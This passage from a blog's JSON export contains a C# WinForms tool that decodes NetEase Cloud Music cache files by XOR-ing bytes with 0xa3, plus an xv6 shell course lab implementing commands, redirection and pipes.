System.Drawing.Size(69, 20); this.inputPathLabel.TabIndex = 0; this.inputPathLabel.Text = &quot;文件路径&quot;; // // groupBox2 // this.groupBox2.Controls.Add(this.chooseOutPath); this.groupBox2.Controls.Add(this.checkBox1); this.groupBox2.Controls.Add(this.outPath); this.groupBox2.Controls.Add(this.outPathLabel); this.groupBox2.Font = new System.Drawing.Font(&quot;微软雅黑&quot;, 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134))); this.groupBox2.Location = new System.Drawing.Point(12, 118); this.groupBox2.Name = &quot;groupBox2&quot;; this.groupBox2.Size = new System.Drawing.Size(758, 125); this.groupBox2.TabIndex = 1; this.groupBox2.TabStop = false; this.groupBox2.Text = &quot;输出&quot;; // // chooseOutPath // this.chooseOutPath.Location = new System.Drawing.Point(709, 44); this.chooseOutPath.Name = &quot;chooseOutPath&quot;; this.chooseOutPath.Size = new System.Drawing.Size(30, 27); this.chooseOutPath.TabIndex = 3; this.chooseOutPath.Text = &quot;...&quot;; this.chooseOutPath.UseVisualStyleBackColor = true; this.chooseOutPath.Click += new System.EventHandler(this.chooseOutPath_Click); // // checkBox1 // this.checkBox1.AutoSize = true; this.checkBox1.Location = new System.Drawing.Point(82, 88); this.checkBox1.Name = &quot;checkBox1&quot;; this.checkBox1.Size = new System.Drawing.Size(274, 24); this.checkBox1.TabIndex = 3; this.checkBox1.Text = &quot;在缓存文件目录下创建同名mp4文件&quot;; this.checkBox1.UseVisualStyleBackColor = true; this.checkBox1.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged); // // outPath // this.outPath.Location = new System.Drawing.Point(82, 44); this.outPath.Name = &quot;outPath&quot;; this.outPath.Size = new System.Drawing.Size(620, 27); this.outPath.TabIndex = 2; // // outPathLabel // this.outPathLabel.AutoSize = true; this.outPathLabel.Location = new System.Drawing.Point(6, 47); this.outPathLabel.Name = &quot;outPathLabel&quot;; this.outPathLabel.Size = new System.Drawing.Size(69, 20); this.outPathLabel.TabIndex = 1; this.outPathLabel.Text = &quot;输出路径&quot;; // // startButton // this.startButton.Font = new System.Drawing.Font(&quot;微软雅黑&quot;, 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134))); this.startButton.Location = new System.Drawing.Point(12, 249); this.startButton.Name = &quot;startButton&quot;; this.startButton.Size = new System.Drawing.Size(90, 30); this.startButton.TabIndex = 2; this.startButton.Text = &quot;开始转换&quot;; this.startButton.UseVisualStyleBackColor = true; this.startButton.Click += new System.EventHandler(this.startButton_Click); // // closeButton // this.closeButton.Font = new System.Drawing.Font(&quot;微软雅黑&quot;, 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134))); this.closeButton.Location = new System.Drawing.Point(680, 249); this.closeButton.Name = &quot;closeButton&quot;; this.closeButton.Size = new System.Drawing.Size(90, 30); this.closeButton.TabIndex = 3; this.closeButton.Text = &quot;退出&quot;; this.closeButton.UseVisualStyleBackColor = true; this.closeButton.Click += new System.EventHandler(this.closeButton_Click); // // progressBar1 // this.progressBar1.Location = new System.Drawing.Point(109, 249); this.progressBar1.Name = &quot;progressBar1&quot;; this.progressBar1.Size = new System.Drawing.Size(565, 29); this.progressBar1.TabIndex = 4; // // Form1 // this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 15F); this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font; this.BackColor = System.Drawing.SystemColors.Control; this.ClientSize = new System.Drawing.Size(782, 303); this.Controls.Add(this.progressBar1); this.Controls.Add(this.closeButton); this.Controls.Add(this.startButton); this.Controls.Add(this.groupBox2); this.Controls.Add(this.groupBox1); this.Name = &quot;Form1&quot;; this.Text = &quot;网易云缓存转换&quot;; this.groupBox1.ResumeLayout(false); this.groupBox1.PerformLayout(); this.groupBox2.ResumeLayout(false); this.groupBox2.PerformLayout(); this.ResumeLayout(false); } #endregion private System.Windows.Forms.GroupBox groupBox1; private System.Windows.Forms.Button chooseInputPath; private System.Windows.Forms.TextBox inputPath; private System.Windows.Forms.Label inputPathLabel; private System.Windows.Forms.GroupBox groupBox2; private System.Windows.Forms.Button chooseOutPath; private System.Windows.Forms.CheckBox checkBox1; private System.Windows.Forms.TextBox outPath; private System.Windows.Forms.Label outPathLabel; private System.Windows.Forms.Button startButton; private System.Windows.Forms.Button closeButton; private System.Windows.Forms.ProgressBar progressBar1; }} Form1.cs123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115using System;using System.Collections.Generic;using System.ComponentModel;using System.Data;using System.Drawing;using System.IO;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Windows.Forms;namespace CloudMusicDecode{ public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void chooseInputPath_Click(object sender, EventArgs e) { OpenFileDialog fileDialog = new OpenFileDialog(); fileDialog.Multiselect = false; fileDialog.Title = &quot;选择文件&quot;; fileDialog.Filter = &quot;uc缓存文件(*.uc)|*.uc&quot;; if(fileDialog.ShowDialog() == DialogResult.OK) { inputPath.Text = fileDialog.FileName; } } private void closeButton_Click(object sender, EventArgs e) { System.Environment.Exit(0); } private void chooseOutPath_Click(object sender, EventArgs e) { SaveFileDialog fileDialog = new SaveFileDialog(); fileDialog.Title = &quot;选择保存路径&quot;; fileDialog.Filter = &quot;音频文件(*.mp4)|*.mp4&quot;; if(fileDialog.ShowDialog() == DialogResult.OK) { outPath.Text = fileDialog.FileName; } } private void checkBox1_CheckedChanged(object sender, EventArgs e) { if(checkBox1.Checked == true) { outPath.Enabled = false; if(inputPath.Text != &quot;&quot;) { int length = inputPath.Text.Length; string str = inputPath.Text.Substring(0, length-3); outPath.Text = str + &quot;.mp4&quot;; } } else { outPath.Enabled = true; } } private void startButton_Click(object sender, EventArgs e) { if (inputPath.Text == &quot;&quot; || outPath.Text == &quot;&quot;) { MessageBox.Show(&quot;请选择正确的文件路径！&quot;, &quot;错误&quot;, MessageBoxButtons.OK); } else { FileStream inputFile = new FileStream(inputPath.Text, FileMode.Open); FileStream outputFile = new FileStream(outPath.Text, FileMode.Create, FileAccess.Write); byte[] buf = new byte[1024]; progressBar1.Visible = true; progressBar1.Minimum = 1; progressBar1.Maximum = (int)new FileInfo(inputPath.Text).Length; progressBar1.Step = 1024; while (true) { int len = inputFile.Read(buf, 0, buf.Length); if(len &gt; 0) { for (int i = 0; i &lt; len; i++) { buf[i] ^= 0xa3; } outputFile.Write(buf, 0, len); } else { break; } startProgress(); } outputFile.Close(); inputFile.Close(); } } private void startProgress() { progressBar1.PerformStep(); } }} 效果展示： 下载地址：https://pan.baidu.com/s/1DLTKRo2yE95IpqzviZdMVQ 提取码：2btc 3. 其他 经过努力找到这样一个在线解析网址： http://tool.liumingye.cn/music/?page=homePage 草… 一点疑惑：使用whois查询可知该站部署于阿里云服务器，所以为什么作者不怕律师函警告呢？","link":"/2020/08/16/%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90PC%E7%BC%93%E5%AD%98%E8%BD%AC%E6%8D%A2mp3/"},{"title":"简化版xv6 shell的编写","text":"操作系统原理课程实验一，要求在给定的xv6 shell框架中补全执行普通命令、重定向命令、管道命令的功能。 注：所有命令执行过程均写在runcmd()中即可，命令的解析在外部已经实现。 一、普通命令1234567case ' ': ecmd = (struct execcmd*)cmd; if(ecmd-&gt;argv[0] == 0) _exit(0); //fprintf(stderr, &quot;exec not implemented\\n&quot;); execlp(ecmd-&gt;argv[0], ecmd-&gt;argv[0], ecmd-&gt;argv[1], NULL); break; 已知argv[0]存放的是命令本体，argv[1]存放的是命令参数，根据execlp()的参数表，，， 二、重定向命令12345678case '&gt;':case '&lt;': rcmd = (struct redircmd*)cmd; //fprintf(stderr, &quot;redir not implemented\\n&quot;); close(rcmd-&gt;fd); open(rcmd-&gt;file, rcmd-&gt;flags); runcmd(rcmd-&gt;cmd); break; 在Linux中，文件标识符0默认连接stdin，1默认连接stdout，2默认连接stderr那么，我们需要做的就是首先关闭当前文件的标准输出（或输入），此时fd已根据‘&lt;’或‘&gt;’被设置为0或1；然后再调用open()函数打开待读/写文件，此时这个文件会被分配当前可用最小文件标识符，即0或1；这样就起到了覆盖原有的标准输入、输出而实现重定向了。 三、管道命令1234567891011121314151617181920212223case '|': pcmd = (struct pipecmd*)cmd; //fprintf(stderr, &quot;pipe not implemented\\n&quot;); pipe(p); if(fork1() == 0){ close(1); dup(p[1]); close(p[0]); close(p[1]); runcmd(pcmd-&gt;left); } if(fork1() == 0){ close(0); dup(p[0]); close(p[0]); close(p[1]); runcmd(pcmd-&gt;right); } close(p[0]); close(p[1]); wait(&amp;r); wait(&amp;r); break; 管道的实现比较复杂。首先，管道是一种特殊的文件，一般不用open()函数进行操作；其次，管道命令的执行需要创建两个子进程分别执行左右命令，然后执行左命令的进程用管道文件覆盖stdout，执行右命令的进程覆盖stdin.这样就可以实现左命令将结果放入管道，右命令从管道读取结果并作为输入执行。而父进程即当前shell进程需要等待两个子进程退出，所以需要两个wait()函数。","link":"/2019/10/19/%E7%AE%80%E5%8C%96%E7%89%88xv6-shell%E7%9A%84%E7%BC%96%E5%86%99/"}],"tags":[{"name":"skills","slug":"skills","link":"/tags/skills/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"bug","slug":"bug","link":"/tags/bug/"},{"name":"android","slug":"android","link":"/tags/android/"},{"name":"misc","slug":"misc","link":"/tags/misc/"},{"name":"course","slug":"course","link":"/tags/course/"},{"name":"network","slug":"network","link":"/tags/network/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"memories","slug":"memories","link":"/tags/memories/"},{"name":"kali","slug":"kali","link":"/tags/kali/"},{"name":"c#","slug":"c","link":"/tags/c/"}],"categories":[{"name":"技术分享","slug":"技术分享","link":"/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"},{"name":"日常划水","slug":"日常划水","link":"/categories/%E6%97%A5%E5%B8%B8%E5%88%92%E6%B0%B4/"},{"name":"忆往昔，知缘起","slug":"忆往昔，知缘起","link":"/categories/%E5%BF%86%E5%BE%80%E6%98%94%EF%BC%8C%E7%9F%A5%E7%BC%98%E8%B5%B7/"}],"pages":[]}